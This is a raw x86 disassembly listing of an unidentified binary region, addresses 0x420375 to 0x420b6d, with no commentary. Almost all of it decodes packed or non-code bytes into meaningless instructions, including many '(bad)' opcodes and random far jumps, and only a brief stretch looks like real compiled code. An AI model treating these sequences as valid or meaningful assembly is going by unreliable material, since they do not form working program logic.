  420375:	aad    0xe3
  420377:	daa    
  420378:	adc    BYTE PTR [esi],ch
  42037a:	fucomp st(7)
  42037c:	popf   
  42037d:	sar    BYTE PTR [esi-0x41413bb6],0xad
  420384:	xor    eax,DWORD PTR [esi+0x2726bd8c]
  42038a:	stos   DWORD PTR es:[edi],eax
  42038b:	pop    ss
  42038c:	inc    ebx
  42038d:	xchg   ebx,eax
  42038e:	dec    esp
  42038f:	push   0x9b7a8dc1
  420394:	add    eax,0xd51a1f05
  420399:	push   edx
  42039a:	mov    edi,0x62aead5b
  42039f:	xchg   ebx,eax
  4203a0:	xor    DWORD PTR [ebx-0x29],ebp
  4203a3:	add    edi,esp
  4203a5:	pop    ds
  4203a6:	iret   
  4203a7:	daa    
  4203a8:	xor    DWORD PTR ds:0x9731ba77,0x68
  4203af:	push   edx
  4203b0:	ror    DWORD PTR gs:[eax],cl
  4203b3:	retf   0xb425
  4203b6:	sbb    ecx,esp
  4203b8:	into   
  4203b9:	(bad)  
  4203ba:	out    0xa9,eax
  4203bc:	jns    0x420394
  4203be:	je     0x4203af
  4203c0:	scas   al,BYTE PTR es:[edi]
  4203c1:	bnd jae 0x420411
  4203c4:	(bad)  
  4203c5:	les    eax,FWORD PTR [eax+0x9d84466]
  4203cb:	cld    
  4203cc:	(bad)  
  4203cd:	js     0x42036e
  4203cf:	dec    ebx
  4203d0:	sahf   
  4203d1:	jno    0x420426
  4203d3:	xor    ch,BYTE PTR [edx-0x7f13e28e]
  4203d9:	aam    0x55
  4203db:	and    edx,edi
  4203dd:	test   BYTE PTR [ebx],0x66
  4203e0:	repnz cmp DWORD PTR [ebx],eax
  4203e3:	xchg   edx,eax
  4203e4:	lods   al,BYTE PTR ds:[esi]
  4203e5:	pop    ebx
  4203e6:	add    BYTE PTR [edx],cl
  4203e8:	mov    ch,dh
  4203ea:	or     eax,0x4ada9dae
  4203ef:	sbb    bh,BYTE PTR [esi-0x31627237]
  4203f5:	push   ds
  4203f6:	scas   eax,DWORD PTR es:[edi]
  4203f7:	sub    eax,0x120596f0
  4203fc:	cmp    BYTE PTR [esp+eax*2+0x6c],dl
  420400:	ret    0x267e
  420403:	pusha  
  420404:	cmp    cl,BYTE PTR [ecx+0x48]
  420407:	hlt    
  420408:	push   esp
  420409:	not    DWORD PTR [eax]
  42040b:	sub    ebp,esi
  42040d:	and    ecx,DWORD PTR [ebp-0x3a]
  420410:	mov    edi,0xe626ec01
  420415:	push   eax
  420416:	dec    ebp
  420417:	pop    ds
  420418:	dec    ebx
  420419:	pop    ebp
  42041a:	daa    
  42041b:	sbb    eax,0xec336e0c
  420420:	jl     0x42044d
  420422:	cs xchg edi,eax
  420424:	mov    esi,DWORD PTR [ebx]
  420426:	xchg   esp,eax
  420427:	test   eax,0x820f3943
  42042c:	pop    esp
  42042d:	mov    dl,0x50
  42042f:	dec    ecx
  420430:	std    
  420431:	and    BYTE PTR [eax-0x2],dh
  420434:	mov    edx,0xa74f89a5
  420439:	pop    eax
  42043a:	fldcw  WORD PTR [ebx]
  42043c:	mov    DWORD PTR [edx-0x2c832c8a],edx
  420442:	xor    DWORD PTR [ebx+0x5a],0x41e424fa
  420449:	das    
  42044a:	cmp    edi,DWORD PTR [ebx]
  42044c:	push   ds
  42044d:	pop    ss
  42044e:	cmp    DWORD PTR [esi-0x57f86c3f],edi
  420454:	sub    DWORD PTR [eax],esi
  420456:	das    
  420457:	or     al,BYTE PTR [ecx-0x5cd0faed]
  42045d:	inc    esp
  42045e:	inc    edi
  42045f:	xchg   edi,eax
  420460:	push   ecx
  420461:	xchg   DWORD PTR [ecx+0x4df9e0c8],eax
  420467:	cmp    eax,0xa6a49c38
  42046c:	or     BYTE PTR ds:0xb6aa018,0x95
  420473:	sbb    BYTE PTR [ecx-0x10],al
  420476:	jle    0x420402
  420478:	xor    eax,0xb4241cb6
  42047d:	fldcw  WORD PTR [edi]
  42047f:	ss enter 0xd646,0x54
  420484:	inc    esi
  420485:	xchg   esi,eax
  420486:	retf   0x50d4
  420489:	scas   eax,DWORD PTR es:[edi]
  42048a:	mov    edx,0xc78459d3
  42048f:	push   ecx
  420490:	mov    ah,0x89
  420492:	add    eax,0xef07b7f
  420497:	sub    BYTE PTR [edx+edx*8-0x67a1f616],bh
  42049e:	pop    ss
  42049f:	sub    eax,0x39d963c3
  4204a4:	lahf   
  4204a5:	mov    bl,0xb8
  4204a7:	and    esi,eax
  4204a9:	xchg   BYTE PTR [esp+edx*4+0x7b5ea4d0],dl
  4204b0:	cld    
  4204b1:	jb     0x420452
  4204b3:	cdq    
  4204b4:	mov    edx,0x52096d9f
  4204b9:	sbb    DWORD PTR [edx+ebp*4],edi
  4204bc:	cmp    eax,0x6af123f0
  4204c1:	shl    DWORD PTR [edi],0x22
  4204c4:	push   ecx
  4204c5:	jnp    0x4204dc
  4204c7:	test   DWORD PTR [ebp+ecx*2+0x36],0x18645c2c
  4204cf:	bound  edx,QWORD PTR [ebx-0x78eea0ba]
  4204d5:	or     eax,0x3ea86184
  4204da:	bound  edx,QWORD PTR [ebx+0x38254af5]
  4204e0:	push   eax
  4204e1:	inc    edi
  4204e2:	xor    al,0x71
  4204e4:	mov    edi,0xf953a8c8
  4204e9:	dec    ebx
  4204ea:	ja     0x4204f5
  4204ec:	and    dl,BYTE PTR [eax-0x1d]
  4204ef:	jmp    0x42054b
  4204f1:	sub    ch,0xb4
  4204f4:	mov    esp,0xc2b3cc9f
  4204f9:	mov    WORD PTR [ebp-0x36],cs
  4204fc:	test   DWORD PTR [edi],edi
  4204fe:	dec    ebp
  4204ff:	stos   DWORD PTR es:[edi],eax
  420500:	xchg   edi,eax
  420501:	add    BYTE PTR [edx-0x47],ch
  420504:	pop    ebp
  420505:	or     BYTE PTR [eax+esi*4+0x7e],dh
  420509:	pop    ebx
  42050a:	outs   dx,DWORD PTR ds:[esi]
  42050b:	data16 in al,dx
  42050d:	cmp    BYTE PTR [edi],cl
  42050f:	bound  ecx,QWORD PTR [edx-0x35]
  420512:	in     al,0x2e
  420514:	add    BYTE PTR [eax+0x555ecd3b],dl
  42051a:	jbe    0x42058d
  42051c:	mov    cl,ah
  42051e:	push   esp
  42051f:	fwait
  420520:	dec    ebx
  420521:	lahf   
  420522:	mov    eax,0x6909f51e
  420527:	sub    bh,dl
  420529:	sub    DWORD PTR [ebp+0x23],edx
  42052c:	jmp    0xb07aeda0
  420531:	daa    
  420532:	pop    ebp
  420533:	sbb    esp,DWORD PTR [edi+0x415fe86]
  420539:	xchg   ebx,eax
  42053a:	xchg   ebp,eax
  42053b:	je     0x4204ec
  42053d:	lods   al,BYTE PTR ds:[esi]
  42053e:	mov    ds:0xc866c7dc,al
  420543:	fadd   DWORD PTR [eax+eiz*8-0x46]
  420547:	cld    
  420548:	inc    ecx
  420549:	repnz daa 
  42054b:	mov    al,ds:0xa26cbe31
  420550:	mov    BYTE PTR [ecx],dh
  420552:	push   es
  420553:	mov    WORD PTR [ebx-0x1befec84],es
  420559:	mov    edx,0x4c2858fb
  42055e:	and    ebx,DWORD PTR [edx-0x5c73c6df]
  420564:	sbb    ch,BYTE PTR [edi+0x23]
  420567:	lds    esp,FWORD PTR [edx-0x6d]
  42056a:	daa    
  42056b:	pop    edi
  42056c:	mov    dh,0xda
  42056e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42056f:	out    0xdd,eax
  420571:	sar    BYTE PTR [esi-0x52],cl
  420574:	pop    edi
  420575:	push   edi
  420576:	ss pop edx
  420578:	popa   
  420579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42057a:	(bad)  
  42057b:	sbb    DWORD PTR [esi-0x69],edx
  42057e:	sar    BYTE PTR [eax+0x744bfdc7],0x44
  420585:	jns    0x4205f6
  420587:	push   esi
  420588:	xor    dh,BYTE PTR [esi-0x53]
  42058b:	out    dx,al
  42058c:	js     0x4205d6
  42058e:	stc    
  42058f:	push   ss
  420590:	or     edx,0x3ab8f4c8
  420596:	data16 jle 0x4205be
  420599:	mov    WORD PTR [ebp+0x69c34449],cs
  42059f:	mov    esi,DWORD PTR ds:0xa8b48d3
  4205a5:	dec    esi
  4205a6:	jae    0x420603
  4205a8:	dec    ecx
  4205a9:	scas   al,BYTE PTR es:[edi]
  4205aa:	loop   0x42058b
  4205ac:	dec    ebp
  4205ad:	jo     0x420548
  4205af:	cmp    BYTE PTR [edi+0x6d67d0b4],0x37
  4205b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205b7:	ss adc eax,0x5e9e2b2c
  4205bd:	pop    ebx
  4205be:	loope  0x420570
  4205c0:	arpl   sp,sp
  4205c2:	jl     0x4205cb
  4205c4:	in     eax,dx
  4205c5:	xor    ebp,DWORD PTR [ecx]
  4205c7:	xchg   esp,eax
  4205c8:	rcr    BYTE PTR [ecx+0xd],cl
  4205cb:	call   0xfd80:0xb03adc85
  4205d2:	arpl   WORD PTR [esp+edx*8-0x68f61780],sp
  4205d9:	and    al,0x63
  4205db:	sbb    DWORD PTR [esi-0x68],edi
  4205de:	fdivr  DWORD PTR ds:0x435935d5
  4205e4:	rcr    ecx,cl
  4205e6:	es stos BYTE PTR es:[edi],al
  4205e8:	add    DWORD PTR [ebp+esi*8-0x43],ebp
  4205ec:	pop    edx
  4205ed:	fcomp  QWORD PTR [edx+0x72]
  4205f0:	mov    eax,0x9fcd00e9
  4205f5:	or     DWORD PTR [edi+0x4c],esi
  4205f8:	js     0x4205c4
  4205fa:	xor    eax,0x13811a85
  4205ff:	fwait
  420600:	or     DWORD PTR [eax-0x164e3446],esp
  420606:	loope  0x42060a
  420608:	add    ch,dl
  42060a:	sbb    DWORD PTR [eax+0x7823c5f7],esp
  420610:	xor    DWORD PTR [ebp+0x1d],edx
  420613:	pop    ebp
  420614:	or     DWORD PTR [edi+0x58c892b7],0xffffff8c
  42061b:	stos   BYTE PTR es:[edi],al
  42061c:	jle    0x42067f
  42061e:	add    esp,DWORD PTR [ecx+0x7e]
  420621:	add    BYTE PTR [eax-0x3a],bl
  420624:	or     BYTE PTR [edx],ch
  420626:	mov    ebx,0x9c601044
  42062b:	sub    esp,edi
  42062d:	int    0x7a
  42062f:	into   
  420630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420631:	in     eax,dx
  420632:	mov    ah,al
  420634:	adc    al,0xa9
  420636:	sti    
  420637:	fdiv   DWORD PTR ds:0x3140655a
  42063d:	push   0x6a
  42063f:	arpl   cx,si
  420641:	mov    ebx,0x176fb535
  420646:	xchg   edi,eax
  420647:	retf   0x38ef
  42064a:	jne    0x4206a5
  42064c:	adc    eax,0xcb0358ed
  420651:	mov    edi,0xe0c3b859
  420656:	pop    ds
  420657:	test   BYTE PTR [esi-0xb],0xf9
  42065b:	scas   al,BYTE PTR es:[edi]
  42065c:	mov    ebp,0x7c5639cf
  420661:	jecxz  0x42060e
  420663:	leave  
  420664:	adc    BYTE PTR [edi+edx*8],0xf3
  420668:	sahf   
  420669:	mov    edx,0xa1a6f961
  42066e:	fwait
  42066f:	inc    esi
  420670:	pop    eax
  420671:	ss test eax,0xc03fd02a
  420677:	xor    al,0x91
  420679:	dec    ebp
  42067a:	add    al,BYTE PTR [edx-0x66b4e31d]
  420680:	loop   0x42064c
  420682:	cmp    ebx,DWORD PTR [ebx]
  420684:	mov    dh,0x41
  420686:	xchg   edi,eax
  420687:	pusha  
  420688:	sbb    esi,ebx
  42068a:	shl    DWORD PTR [eax+esi*4+0x1b],0x32
  42068f:	mov    ebx,0xf27feb70
  420694:	scas   al,BYTE PTR es:[edi]
  420695:	fcmovne st,st(3)
  420697:	jl     0x420661
  420699:	jne    0x420713
  42069b:	in     al,dx
  42069c:	lods   eax,DWORD PTR ss:[esi]
  42069e:	popa   
  42069f:	push   cs
  4206a0:	int3   
  4206a1:	or     bh,BYTE PTR [ebx+0x75208e4a]
  4206a7:	and    DWORD PTR [esi],0xffffffde
  4206aa:	ja     0x420656
  4206ac:	cld    
  4206ad:	shl    BYTE PTR [eax],1
  4206af:	sahf   
  4206b0:	mov    fs,WORD PTR gs:[ecx-0x439eae08]
  4206b7:	mov    esi,0xf1ddeb99
  4206bc:	mov    dl,0x38
  4206be:	jo     0x4206d9
  4206c0:	pop    edi
  4206c1:	or     esi,DWORD PTR [esi-0x7a2dbebb]
  4206c7:	jnp    0x42066b
  4206c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ca:	nop
  4206cb:	pop    eax
  4206cc:	lock (bad) 
  4206ce:	loop   0x42073e
  4206d0:	sbb    BYTE PTR [edx+0x56],cl
  4206d3:	dec    ecx
  4206d4:	icebp  
  4206d5:	out    dx,eax
  4206d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206d7:	data16 adc ch,ah
  4206da:	(bad)  
  4206db:	mov    ebx,0xef051567
  4206e0:	mov    ecx,0x878206a5
  4206e5:	add    DWORD PTR [ebx],ebp
  4206e7:	sbb    BYTE PTR [ebx],dh
  4206e9:	sub    bl,bh
  4206eb:	fs gs push ss
  4206ee:	les    esp,FWORD PTR [edi-0x29595263]
  4206f4:	pusha  
  4206f5:	out    dx,eax
  4206f6:	ret    
  4206f7:	pop    edi
  4206f8:	pop    esp
  4206f9:	shl    BYTE PTR [ecx-0x65737a47],1
  4206ff:	xor    DWORD PTR [ebp-0x71],edi
  420702:	in     eax,0x14
  420704:	mov    ah,0x88
  420706:	in     eax,dx
  420707:	sub    al,0xc4
  420709:	or     BYTE PTR [ebp-0x58],0xae
  42070d:	out    0xcf,al
  42070f:	pop    esi
  420710:	or     DWORD PTR [ebp+0xd],ebp
  420713:	sub    ecx,DWORD PTR ds:0x92bb93
  420719:	fs jnp 0x4206f7
  42071c:	retf   0x7f4f
  42071f:	sbb    dl,BYTE PTR [ebx+0x4a3eb039]
  420725:	dec    esp
  420726:	imul   edx,DWORD PTR [eax+0x23],0x54
  42072a:	loopne 0x4206e4
  42072c:	shr    edi,1
  42072e:	and    eax,DWORD PTR [esi+0x6]
  420731:	out    0xb5,al
  420733:	pop    ss
  420734:	mov    ds:0x3935ebdc,al
  420739:	(bad)  
  42073a:	outs   dx,DWORD PTR ds:[esi]
  42073b:	jo     0x42070e
  42073d:	sbb    esp,edx
  42073f:	(bad)  
  420740:	mov    ch,0xdf
  420742:	jnp    0x4206e5
  420744:	push   0xa2806b96
  420749:	int    0xe4
  42074b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42074c:	fwait
  42074d:	xor    edx,0x6dda
  420753:	mov    esi,DWORD PTR [ebp-0x108]
  420759:	and    edx,esi
  42075b:	and    edx,0xe0c
  420761:	or     edx,0x5b
  420764:	mov    esi,DWORD PTR [ebp-0xe8]
  42076a:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42076e:	add    ecx,eax
  420770:	lea    eax,[edx+ecx*1-0xc5b]
  420777:	mov    DWORD PTR [ebp-0xa8],eax
  42077d:	and    DWORD PTR [ebp-0x144],0x0
  420784:	jmp    0x420b7d
  420789:	mov    eax,DWORD PTR [ebp-0x144]
  42078f:	inc    eax
  420790:	mov    DWORD PTR [ebp-0x144],eax
  420796:	jmp    0x420b7d
  42079b:	daa    
  42079c:	cmp    eax,0x75b775ce
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	(bad)  
  4207a3:	xchg   ecx,eax
  4207a4:	(bad)  
  4207a5:	dec    esi
  4207a6:	sahf   
  4207a7:	adc    esp,DWORD PTR [edi-0x5c8361a2]
  4207ad:	sar    BYTE PTR [esi-0x41413bb6],0xc0
  4207b4:	push   ebx
  4207b5:	dec    ebx
  4207b6:	mov    DWORD PTR [esi-0x54],ecx
  4207b9:	aaa    
  4207ba:	shl    ebp,1
  4207bc:	popa   
  4207bd:	push   ds
  4207be:	adc    al,0x11
  4207c0:	cmp    eax,0xbca09710
  4207c5:	add    edx,ecx
  4207c7:	mov    eax,eax
  4207c9:	das    
  4207ca:	shl    bl,0xc9
  4207cd:	push   ebp
  4207ce:	adc    eax,0x6b6e13ff
  4207d3:	fs aam 0xc
  4207d6:	push   0x6ab8eb84
  4207db:	add    al,0x56
  4207dd:	cwde   
  4207de:	cwde   
  4207df:	stos   BYTE PTR es:[edi],al
  4207e0:	pop    edi
  4207e1:	mov    dl,0x22
  4207e3:	xchg   esp,eax
  4207e4:	sub    eax,0x25103ae8
  4207e9:	inc    edi
  4207ea:	retf   
  4207eb:	cld    
  4207ec:	pop    ebx
  4207ed:	imul   edx,DWORD PTR [edx+0x21],0x78836fa0
  4207f4:	mov    gs,WORD PTR [esi-0x3353850b]
  4207fa:	mov    gs:0xa5cf35da,al
  420800:	mov    ah,0xbb
  420802:	jno    0x4207fc
  420804:	pop    eax
  420805:	xlat   BYTE PTR ds:[ebx]
  420806:	or     ebp,esi
  420808:	sub    al,0xed
  42080a:	retf   0xe8d9
  42080d:	mov    ecx,0xf2ff1a35
  420812:	test   al,0xcd
  420814:	dec    eax
  420815:	stos   DWORD PTR es:[edi],eax
  420816:	adc    edi,DWORD PTR [edi+0x568fd187]
  42081c:	dec    eax
  42081d:	js     0x4207cd
  42081f:	mov    eax,ds:0x6ef60da
  420824:	iret   
  420825:	cs arpl si,sp
  420828:	or     eax,0x977f7705
  42082d:	inc    esp
  42082e:	mov    ch,0x26
  420830:	nop
  420831:	mov    ebx,0x7684a98f
  420836:	xchg   ebx,eax
  420837:	addr16 cli 
  420839:	aad    0xcf
  42083b:	push   0x4e
  42083d:	test   ebp,esp
  42083f:	enter  0x9282,0x18
  420843:	aas    
  420844:	rol    cl,0x9d
  420847:	push   eax
  420848:	stos   BYTE PTR es:[edi],al
  420849:	xor    ch,ch
  42084b:	xor    ebp,DWORD PTR [esi+ebp*8-0x1e87bf76]
  420852:	neg    ecx
  420854:	ins    DWORD PTR es:[edi],dx
  420855:	xor    eax,0x568f575f
  42085a:	inc    ebx
  42085b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42085c:	xor    esp,DWORD PTR [ebp+0x19a4bac4]
  420862:	mov    cl,0xb0
  420864:	lds    edi,FWORD PTR [edx-0x15]
  420867:	(bad)  
  420868:	data16 lahf 
  42086a:	daa    
  42086b:	in     eax,0x4f
  42086d:	test   BYTE PTR ds:0x68059e23,ah
  420873:	int    0x8f
  420875:	jmp    0x420832
  420877:	and    DWORD PTR [edi],edx
  420879:	call   0x1bbf:0x94f5aeae
  420880:	fdivr  st(7),st
  420882:	sbb    cl,cl
  420884:	adc    al,bl
  420886:	cli    
  420887:	sahf   
  420888:	fnstsw WORD PTR [edi-0x4e]
  42088b:	inc    esi
  42088c:	ins    BYTE PTR es:[edi],dx
  42088d:	sub    DWORD PTR [ebx-0x3e1f20ed],esi
  420893:	iret   
  420894:	mov    eax,ds:0x3dbd8a6
  420899:	jbe    0x42089f
  42089b:	sub    BYTE PTR [esi+ecx*4],bl
  42089e:	inc    eax
  42089f:	pop    ds
  4208a0:	call   0xd9a5092
  4208a5:	rep lods al,BYTE PTR gs:[esi]
  4208a8:	inc    ecx
  4208a9:	pop    edx
  4208aa:	lahf   
  4208ab:	int3   
  4208ac:	dec    edi
  4208ad:	and    al,0x65
  4208af:	xlat   BYTE PTR ds:[ebx]
  4208b0:	sub    DWORD PTR [edi+0x48],esp
  4208b3:	popa   
  4208b4:	fistp  DWORD PTR [ebx]
  4208b6:	(bad)  
  4208b7:	jecxz  0x42084b
  4208b9:	stos   DWORD PTR es:[edi],eax
  4208ba:	outs   dx,BYTE PTR ds:[esi]
  4208bb:	out    dx,eax
  4208bc:	cwde   
  4208bd:	das    
  4208be:	adc    eax,0xdb81235d
  4208c3:	ss mov bl,0x8c
  4208c6:	mov    ch,0xbf
  4208c8:	mov    bh,0xa8
  4208ca:	adc    edx,DWORD PTR [esi]
  4208cc:	in     eax,0x16
  4208ce:	add    DWORD PTR [edi+eiz*2-0x7f],0xffffffcc
  4208d3:	(bad)  
  4208d4:	stos   BYTE PTR es:[edi],al
  4208d5:	push   ebp
  4208d6:	cdq    
  4208d7:	xor    eax,0xc9156e06
  4208dc:	aaa    
  4208dd:	lea    eax,[edx]
  4208df:	push   esp
  4208e0:	push   edi
  4208e1:	adc    eax,0x6e0ca6c9
  4208e6:	scas   al,BYTE PTR es:[edi]
  4208e7:	dec    edi
  4208e8:	rcl    BYTE PTR ds:0x87085122,0x20
  4208ef:	push   eax
  4208f0:	pop    ebp
  4208f1:	in     al,dx
  4208f2:	xchg   DWORD PTR [edi-0x6b],eax
  4208f5:	jg     0x4208de
  4208f7:	xor    BYTE PTR ss:[ecx+esi*4],0xd1
  4208fc:	es push 0x14
  4208ff:	call   DWORD PTR [edi+0x56]
  420902:	retf   0x3295
  420905:	call   0x7e2675cf
  42090a:	stos   BYTE PTR es:[edi],al
  42090b:	(bad)  
  42090c:	push   cs
  42090d:	stos   DWORD PTR es:[edi],eax
  42090e:	sub    DWORD PTR [ebx-0x80],0xfffffff4
  420912:	and    esp,edx
  420914:	test   edi,esp
  420916:	adc    BYTE PTR [eax-0x62],ch
  420919:	cwde   
  42091a:	scas   eax,DWORD PTR es:[edi]
  42091b:	mov    cl,0xa6
  42091d:	xor    BYTE PTR [ebx+0x3bafd804],cl
  420923:	add    DWORD PTR [edi+0x5],edx
  420926:	scas   eax,DWORD PTR es:[edi]
  420927:	mov    ebp,0x2186efa1
  42092c:	clc    
  42092d:	leave  
  42092e:	ret    0xb695
  420931:	dec    eax
  420932:	pop    ebp
  420933:	mov    edi,0xfdfa45ee
  420938:	and    edx,DWORD PTR [ebp-0x25]
  42093b:	dec    esp
  42093c:	leave  
  42093d:	imul   esp,DWORD PTR [ecx],0xd1d442fe
  420943:	push   ebp
  420944:	dec    edi
  420945:	retf   0xbb78
  420948:	loopne 0x420939
  42094a:	pop    esp
  42094b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42094c:	fwait
  42094d:	retf   
  42094e:	loop   0x4208f4
  420950:	sub    cl,BYTE PTR [eax]
  420952:	push   es
  420953:	test   al,0x14
  420955:	loop   0x4209a9
  420957:	pop    ebx
  420958:	std    
  420959:	enter  0x6a46,0xe9
  42095d:	push   edx
  42095e:	(bad)  
  42095f:	xchg   esp,eax
  420960:	push   ebx
  420961:	stos   BYTE PTR es:[edi],al
  420962:	inc    ebp
  420963:	push   esi
  420964:	push   ebp
  420965:	pop    ds
  420966:	loop   0x420922
  420968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420969:	cmp    al,0x71
  42096b:	stos   BYTE PTR es:[edi],al
  42096c:	mov    ecx,0x9016cbbc
  420971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420972:	jle    0x4209e7
  420974:	mov    ds:0x90016e1,al
  420979:	test   eax,0x77ecc039
  42097e:	(bad)  
  42097f:	and    eax,0x57868e5b
  420984:	push   0xffffffd4
  420986:	mov    ds:0x61c5fa61,eax
  42098b:	or     edi,DWORD PTR [ebp+0x10]
  42098e:	push   0xa96d4341
  420993:	fnstenv [edx+0x53e8070a]
  420999:	dec    eax
  42099a:	fistp  DWORD PTR [esi+0x21acfd3a]
  4209a0:	push   ebx
  4209a1:	cli    
  4209a2:	nop
  4209a3:	retf   
  4209a4:	call   0xe09861ec
  4209a9:	adc    edx,ecx
  4209ab:	in     al,0x4e
  4209ad:	pop    edx
  4209ae:	clc    
  4209af:	push   ebp
  4209b0:	es icebp 
  4209b2:	xor    cl,BYTE PTR [ecx-0x73f47d09]
  4209b8:	mov    eax,0x92fdb7d5
  4209bd:	mov    eax,0xf25e2f68
  4209c2:	xor    al,al
  4209c4:	and    edi,edx
  4209c6:	fist   DWORD PTR [esi]
  4209c8:	sub    eax,0xe3d6ba34
  4209cd:	pop    eax
  4209ce:	sbb    BYTE PTR [ecx-0x79b5c4b4],bl
  4209d4:	jp     0x4209d6
  4209d6:	inc    ebp
  4209d7:	mov    edi,0xc5f49262
  4209dc:	stc    
  4209dd:	pop    ebp
  4209de:	or     eax,0x59418535
  4209e3:	jb     0x4209f5
  4209e5:	pop    esp
  4209e6:	ror    DWORD PTR [esi+ebp*4],1
  4209e9:	adc    eax,DWORD PTR ss:[esi]
  4209ec:	shr    BYTE PTR [ecx],cl
  4209ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209ef:	out    0x3d,eax
  4209f1:	mov    esi,DWORD PTR [ecx-0x41c8bd6e]
  4209f7:	xor    eax,0xa5534655
  4209fc:	mov    WORD PTR [ecx+0x6cbb5fb6],gs
  420a02:	mov    gs,ebx
  420a04:	inc    ebp
  420a05:	jmp    0x9c20:0x62b02650
  420a0c:	int    0x6d
  420a0e:	ins    DWORD PTR es:[edi],dx
  420a0f:	push   ds
  420a10:	sahf   
  420a11:	xchg   DWORD PTR [eax],ebp
  420a13:	enter  0xfd78,0x66
  420a17:	scas   eax,DWORD PTR es:[edi]
  420a18:	scas   eax,DWORD PTR es:[edi]
  420a19:	xchg   edi,eax
  420a1a:	call   0x9a334ed2
  420a1f:	(bad)  
  420a21:	push   0x21
  420a23:	sbb    BYTE PTR [edx],0x2b
  420a26:	in     al,dx
  420a27:	jns    0x420a11
  420a29:	sti    
  420a2a:	mov    DWORD PTR [esi-0x69],0x474755c4
  420a31:	adc    BYTE PTR [edx],0xd9
  420a34:	xchg   edx,eax
  420a35:	adc    al,0xa6
  420a37:	arpl   ax,dx
  420a39:	ins    BYTE PTR es:[edi],dx
  420a3a:	jecxz  0x420a9f
  420a3c:	ret    0x7d8f
  420a3f:	fidivr WORD PTR [esi+0x2d65b6e3]
  420a45:	out    dx,eax
  420a46:	fs push ds
  420a48:	xchg   esp,eax
  420a49:	sbb    ebp,DWORD PTR [edx-0x8]
  420a4c:	jns    0x420a6a
  420a4e:	and    eax,0x1a07dc54
  420a53:	(bad)  
  420a54:	xor    eax,0x71a0c421
  420a59:	mov    ds:0xb1cf644,al
  420a5e:	xor    DWORD PTR [ebx+eax*4+0x66222578],eax
  420a65:	sar    DWORD PTR [bx+di-0x7f],cl
  420a69:	add    eax,0x80d6a0f6
  420a6e:	popf   
  420a6f:	push   edi
  420a70:	sbb    BYTE PTR [esi+ebx*8+0x5c],ah
  420a74:	sbb    esi,DWORD PTR [edi+0x23]
  420a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a78:	or     ebp,DWORD PTR [edx]
  420a7a:	mov    bl,0x82
  420a7c:	xchg   ecx,eax
  420a7d:	and    eax,0x2d02934a
  420a82:	cs test ebx,edi
  420a85:	or     eax,0xdb1e9837
  420a8a:	dec    ecx
  420a8b:	into   
  420a8c:	call   0xf89a:0x28508a0c
  420a93:	dec    esp
  420a94:	ins    BYTE PTR es:[edi],dx
  420a95:	rcr    DWORD PTR ds:0xc98ccba2,1
  420a9b:	add    eax,0xb5c8ba1b
  420aa0:	test   BYTE PTR [esi+0x785074a4],cl
  420aa6:	push   ecx
  420aa7:	mov    ebp,DWORD PTR [edx+0x73d0b05b]
  420aad:	xor    al,0x6
  420aaf:	imul   ecx,edx,0xffffffd2
  420ab2:	dec    ecx
  420ab3:	das    
  420ab4:	inc    ebp
  420ab5:	or     eax,0x29d4f057
  420aba:	popf   
  420abb:	mov    ds:0x8c5ec7bd,eax
  420ac0:	pmulhw mm7,QWORD PTR [edx]
  420ac3:	push   0x8
  420ac5:	stos   DWORD PTR es:[edi],eax
  420ac6:	jmp    0x220a065c
  420acb:	mov    ah,0xde
  420acd:	aad    0xfb
  420acf:	and    edx,DWORD PTR [esi+0x6f]
  420ad2:	sbb    al,0x28
  420ad4:	jmp    0x3057:0xc202eebf
  420adb:	ret    0xbd52
  420ade:	enter  0x807f,0xa1
  420ae2:	jg     0x420ac8
  420ae4:	ja     0x420afb
  420ae6:	mov    al,ds:0x5ccf4913
  420aeb:	xchg   esp,eax
  420aec:	popa   
  420aed:	inc    ebp
  420aee:	mov    dl,0x5d
  420af0:	pop    ebp
  420af1:	inc    esi
  420af2:	inc    esp
  420af3:	int3   
  420af4:	mov    ch,0xa8
  420af6:	fwait
  420af7:	mov    BYTE PTR fs:[ebp-0x2bb31feb],bl
  420afe:	lock xchg edi,eax
  420b00:	test   al,0xc1
  420b02:	inc    ebp
  420b03:	cs jmp 0x9f253a2a
  420b09:	mov    edi,0x6e3e5720
  420b0e:	addr16 in eax,dx
  420b10:	pop    edx
  420b11:	jno    0x420b24
  420b13:	push   edi
  420b14:	clc    
  420b15:	mov    ds:0x58b0ecbf,al
  420b1a:	aaa    
  420b1b:	sub    edx,DWORD PTR [esi-0x72]
  420b1e:	jbe    0x420b6b
  420b20:	sub    ecx,DWORD PTR [ebp-0x6f]
  420b23:	cmp    DWORD PTR [ebx+ebp*8-0x34d986a],edi
  420b2a:	jno    0x420ba4
  420b2c:	mov    edi,0xcf68eaef
  420b31:	dec    ecx
  420b32:	out    dx,al
  420b33:	in     al,0xf
  420b35:	adc    al,0x5b
  420b37:	mov    esi,0x4bd9c34d
  420b3c:	fwait
  420b3d:	jmp    0x189b:0xd13f0447
  420b44:	jnp    0x420b17
  420b46:	push   0xffffffbd
  420b48:	imul   esp,DWORD PTR [esi+0x47],0x23
  420b4c:	sbb    bh,BYTE PTR [ecx+0x45]
  420b4f:	in     eax,0x1
  420b51:	addr16 xchg ebp,eax
  420b53:	stc    
  420b54:	inc    BYTE PTR [edx-0x593fabc6]
  420b5a:	out    dx,eax
  420b5b:	and    eax,esi
  420b5d:	inc    esi
  420b5e:	xchg   ebx,eax
  420b5f:	call   0x4c24346a
  420b64:	cdq    
  420b65:	fucomp st(2)
  420b67:	ins    BYTE PTR es:[edi],dx
  420b68:	data16 cmp al,ah
  420b6b:	xor    edx,ebp
  420b6d:	std    
